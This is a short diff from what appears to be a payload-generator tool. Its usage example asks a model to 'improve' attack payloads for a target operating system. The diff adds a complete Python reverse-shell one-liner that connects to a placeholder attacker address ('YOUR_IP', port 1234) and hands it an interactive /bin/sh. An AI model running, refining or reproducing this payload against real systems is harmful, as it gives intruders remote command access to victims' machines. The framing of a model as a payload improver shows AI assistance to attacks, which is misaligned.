@@ -143,8 +143,9 @@ if __name__ == "__main__":
 
     # Example 1: Payload modification
     modified_payload = generator.generate_payload(
-        existing_payload="print('hello')",
-        prompt="Convert to reverse shell payload for Windows",
+        existing_payload = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('YOUR_IP',1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"
+,
+        prompt="Improve the payload for Windows",
         operating_system="Windows"
     )
     generator.print_payload(modified_payload, "MODIFIED PAYLOAD", save_payload=True)
